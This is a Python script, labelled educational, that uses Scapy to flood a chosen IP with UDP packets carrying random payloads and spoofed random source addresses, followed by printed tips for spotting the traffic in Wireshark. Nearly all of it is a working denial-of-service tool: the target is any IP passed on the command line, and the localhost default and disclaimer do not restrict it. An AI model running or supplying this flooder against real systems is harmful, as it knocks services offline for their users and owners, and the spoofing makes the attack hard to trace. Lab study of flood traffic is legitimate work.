"""
UDP Flood Attack Simulation
============================
Educational purposes ONLY. Use only on your own lab/localhost.

A UDP Flood overwhelms a target by sending massive amounts of UDP datagrams:
  1. Attacker blasts random UDP packets to various ports
  2. Server checks for listening application on each port
  3. If no application → server sends ICMP "Port Unreachable" back
  4. Volume exhausts bandwidth and CPU → legitimate traffic dropped

Wireshark filter to analyze: udp && ip.dst == <target_ip>
"""

from scapy.all import IP, UDP, Raw, send, RandShort, RandIP
import random
import string
import time
import argparse


def random_payload(size: int) -> bytes:
    """Generate a random ASCII payload of given byte size."""
    return ("".join(random.choices(string.ascii_letters + string.digits, k=size))).encode()


def udp_flood(target_ip: str, target_port: int, count: int, payload_size: int, delay: float):
    """
    Send UDP packets with random payloads to exhaust target bandwidth.

    Args:
        target_ip    : Victim IP (use 127.0.0.1 for localhost lab)
        target_port  : Target port (0 = random port per packet)
        count        : Number of packets to send
        payload_size : Bytes of random data per packet
        delay        : Seconds between packets
    """
    print(f"[*] Starting UDP Flood → {target_ip}:{target_port if target_port else 'RANDOM'}")
    print(f"[*] Sending {count} packets | payload={payload_size}B | delay={delay}s")
    print("[*] Press Ctrl+C to stop early\n")

    sent = 0
    total_bytes = 0

    try:
        for i in range(count):
            dport = target_port if target_port else random.randint(1, 65535)
            payload = random_payload(payload_size)

            pkt = (
                IP(src=str(RandIP()), dst=target_ip) /
                UDP(sport=RandShort(), dport=dport) /
                Raw(load=payload)
            )
            send(pkt, verbose=False)
            sent += 1
            total_bytes += payload_size + 28  # UDP/IP header overhead

            if sent % 100 == 0:
                print(f"  [+] Sent {sent}/{count} UDP packets "
                      f"({total_bytes / 1024:.1f} KB total)...")

            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        pass

    print(f"\n[✓] UDP Flood complete.")
    print(f"    Packets sent : {sent}")
    print(f"    Data sent    : {total_bytes / 1024:.2f} KB ({total_bytes / (1024**2):.3f} MB)")

    print("\n--- Wireshark Analysis Guide ---")
    print(f"Filter : udp && ip.dst == {target_ip}")
    print("Look for: High volume of UDP packets from many source IPs")
    print("          ICMP 'Port Unreachable' replies from target (dst port was closed)")
    print("          Bandwidth spike visible in Statistics → IO Graph")
    print("          Use Statistics → Conversations (UDP tab) to see top talkers")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP Flood Simulation (Educational)")
    parser.add_argument("--target",   default="127.0.0.1",   help="Target IP (default: 127.0.0.1)")
    parser.add_argument("--port",     type=int, default=0,    help="Target port (0=random, default: 0)")
    parser.add_argument("--count",    type=int, default=500,  help="Number of packets (default: 500)")
    parser.add_argument("--size",     type=int, default=1024, help="Payload bytes per packet (default: 1024)")
    parser.add_argument("--delay",    type=float, default=0,  help="Delay between packets in sec (default: 0)")
    args = parser.parse_args()

    udp_flood(args.target, args.port, args.count, args.size, args.delay)
